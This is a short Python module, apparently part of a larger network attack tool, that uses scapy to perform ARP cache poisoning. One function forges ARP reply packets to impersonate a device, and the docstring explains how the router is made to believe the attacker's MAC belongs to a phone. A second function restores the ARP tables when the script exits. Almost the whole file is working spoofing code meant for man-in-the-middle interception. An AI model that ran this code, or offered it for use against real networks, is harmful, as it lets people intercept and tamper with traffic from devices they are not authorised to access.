import scapy.all as scapy
from scapy.all import conf
from ..utils import get_mac

def send_spoof_packet(target_ip, spoof_ip, target_mac):
    """
    This function takes two arguments; the ip of the arp poisoning target, and the ip of the device being spoofed.
    First, collect the target_ip's mac adress with the get_mac util function.
    Then, use scapy.ARP() to build the malicious packet. This packet is an "answer"; we are asserting to the network's ARP table the new,
    impersonated mac address which the router thinks is the phone. 
    Finally, send the packet to the network with scapy.send()
    """

    # Poison the router ARP cache
    # op = 2; this is an answer, not a request
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Layer 2 Ethernet frame, setting destination MAC
    ether_frame = scapy.Ether(dst=target_mac)

    # Combine frame and ARP packet
    full_packet = ether_frame / arp_packet

    # Send packet to network
    scapy.sendp(full_packet, verbose=False)

def restore_network(destination_ip, source_ip, destination_mac, source_mac):
    """
    Restores ARP tables functionality on script exit.
    destination_mac; MAC address of target device
    destination_ip; IP adress of target device
    source_mac; MAC address of router
    source_ip; IP address of router
    """

    arp_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_packet, count=4, verbose=False)